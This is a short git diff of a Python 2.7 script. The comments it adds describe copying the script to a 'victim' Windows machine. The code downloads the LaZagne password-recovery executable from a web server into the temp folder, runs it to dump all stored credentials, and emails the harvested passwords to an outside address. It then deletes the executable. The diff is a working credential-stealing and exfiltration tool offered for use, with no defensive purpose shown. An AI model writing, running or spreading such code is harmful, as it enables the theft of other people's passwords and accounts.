@@ -1,4 +1,9 @@
 #!/usr/bin/python2.7
+#The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer.
+#https://github.com/AlessandroZ/LaZagne  download this LaZagne file 
+#it works on Windows, linux, mac but in this script we use lazagne.exe to recover passwords
+#copy the script to victim machine this scripts should run on victim side windows_host 
+
 
 import requests
 import subprocess
@@ -26,6 +31,8 @@ def send_mail(email,password,message):
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
 download("http://localhost where lazagne .exe is stored")
+#host lazagne.exe on webserver put that link to download the lazagne.exe or 
+#copy the lazagne.exe to victim and run his script in that path
 result = subprocess.check_output("lazagne.exe all",shell=True)
 send_mail("mail@gmail.com","password",result)
 os.remove("lazagne.exe")
